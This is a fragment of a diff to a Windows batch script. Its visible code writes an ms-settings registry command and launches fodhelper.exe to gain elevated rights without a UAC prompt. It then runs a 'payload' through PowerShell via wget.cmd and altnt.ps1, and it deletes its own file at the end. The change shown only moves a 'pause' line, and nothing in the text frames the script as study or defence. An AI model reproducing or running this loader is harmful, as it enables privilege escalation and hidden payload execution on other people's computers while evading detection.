@@ -28,14 +28,12 @@ reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /k powe
 REM Run fodhelper.exe to trigger the elevated command
 start fodhelper.exe
 
-pause
-
 
 @REM run payload
 powershell ./wget.cmd; ./altnt.ps1
 
 @REM cd back into initial location
 cd "%INITIALPATH%"
-
+pause
 @REM self delete
 del initial.cmd
